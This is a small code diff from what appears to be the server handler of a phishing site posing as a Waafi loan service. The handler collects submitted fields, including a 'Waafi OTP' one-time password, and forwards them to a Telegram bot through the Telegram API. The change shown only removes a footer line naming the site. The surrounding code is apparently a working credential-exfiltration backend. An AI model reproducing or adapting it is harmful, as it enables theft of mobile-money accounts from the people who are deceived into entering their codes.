@@ -46,7 +46,6 @@ export default async function handler(req, res) {
   if (p['Waafi OTP'])   text += line('Waafi OTP', p['Waafi OTP']);
 
   text += '\n' + divider();
-  text += `<i>waafiloans.vercel.app</i>`;
 
   try {
     const resp = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
